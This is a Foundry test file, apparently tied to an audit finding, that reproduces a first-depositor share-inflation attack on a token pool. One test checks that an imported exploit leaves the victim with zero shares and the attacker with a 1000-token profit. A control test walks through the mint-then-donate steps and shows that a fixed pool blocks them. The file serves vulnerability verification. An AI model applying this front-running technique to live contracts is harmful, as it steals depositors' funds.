// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, SpaToken, SelfPeggingAssetFixed, SpaVictimFixed} from
    "./62659-initial-mint-front-run-inflation-attack-mixbytes-none-nuts-f.sol";

contract Finding62659Test is Test {
    function test_exploit_victim_mints_zero_shares() public {
        Exploit e = new Exploit();
        uint256 start = e.token().balanceOf(address(e));
        e.run();
        assertEq(start, 1_000e18 + 1, "started with 1 wei plus donation");
        assertEq(e.token().balanceOf(address(e)), 2_000e18 + 1, "redeemed donation and victim");
        assertEq(e.token().balanceOf(address(e)) - start, 1_000e18, "profit 1000");
        assertEq(e.pool().sharesOf(address(e.victim())), 0, "victim shares 0");
    }

    function test_control_zero_shares_reverts() public {
        SpaToken token = new SpaToken();
        SelfPeggingAssetFixed pool = new SelfPeggingAssetFixed(token);
        SpaVictimFixed victim = new SpaVictimFixed(token, pool);
        token.mint(address(this), 1_000e18 + 1);
        token.mint(address(victim), 1_000e18);
        token.approve(address(pool), type(uint256).max);
        pool.mint(1, 0);
        token.transfer(address(pool), 1_000e18);

        bool minted = true;
        try victim.mint(1_000e18) {
            minted = true;
        } catch {
            minted = false;
        }
        assertFalse(minted, "zero shares revert");
        assertEq(token.balanceOf(address(victim)), 1_000e18, "victim kept 1000");
        uint256 out = pool.redeem(1);
        assertEq(out, 1_000e18 + 1, "attacker recovers only the donation");
        assertEq(token.balanceOf(address(this)), 1_000e18 + 1, "no profit");
    }
}
